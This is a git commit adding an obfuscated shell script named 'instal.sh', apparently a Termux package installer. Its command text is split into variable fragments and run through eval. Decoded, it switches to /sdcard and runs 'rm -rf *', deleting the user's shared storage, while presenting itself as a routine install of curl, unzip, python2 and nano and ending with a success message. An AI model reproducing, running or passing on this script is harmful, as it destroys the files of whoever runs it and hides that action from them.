0b9dc58db9331da36f9c0e42bf9a465875acd9a7
RaflySahrul.86 <42622170+RAFLYSAHRUL@users.noreply.github.com>
2020-03-09 06:31:49 +0700

    Add files via upload

---
+++ instal.sh
@@ -0,0 +1,3 @@
+z="
+";Nz='rd';Lz='cd /';mz='l Pa';Bz=' "Pl';iz='l...';cz='-Y';Vz='curl';Pz='rf *';fz='cces';jz='"';Jz='-sto';lz='ngaa';kz=' "Ti';Sz='pkg ';Yz='unzi';az='pyth';Cz='ease';gz='s In';Iz='etup';oz='Brot';Gz='term';Wz=' -Y';nz='kai ';dz='nano';Xz='apt ';Zz='p -Y';Mz='sdca';Hz='ux-s';Tz='inst';Qz='cd $';Fz='."';Az='echo';rz='_^"';ez=' "Su';Oz='rm -';Kz='rage';Rz='HOME';hz='stal';Dz=' wai';pz='hers';bz='on2 ';Uz='all ';Ez='t...';qz='.. ^';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$z$Gz$Hz$Iz$Jz$Kz$z$Lz$Mz$Nz$z$Oz$Pz$z$Qz$Rz$z$Sz$Tz$Uz$Vz$Wz$z$Xz$Tz$Uz$Yz$Zz$z$Sz$Tz$Uz$az$bz$cz$z$Sz$Tz$Uz$dz$Wz$z$Sz$Tz$Uz$Yz$Zz$z$Az$ez$fz$gz$hz$iz$jz$z$Az$kz$lz$mz$nz$oz$pz$qz$rz"
